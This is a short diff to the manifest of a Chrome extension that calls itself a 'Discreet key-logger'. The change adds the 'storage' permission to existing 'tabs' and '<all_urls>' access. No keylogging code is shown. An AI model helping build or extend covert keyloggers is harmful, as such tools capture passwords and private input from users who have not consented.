@@ -3,7 +3,7 @@
   "description": "Discreet key-logger for Google Chrome",
   "version": "1.0",
 	"permissions": [
-		"tabs", "<all_urls>"
+		"tabs", "<all_urls>", "storage"
 	],
   "browser_action": {
     "default_icon": "icon.png",
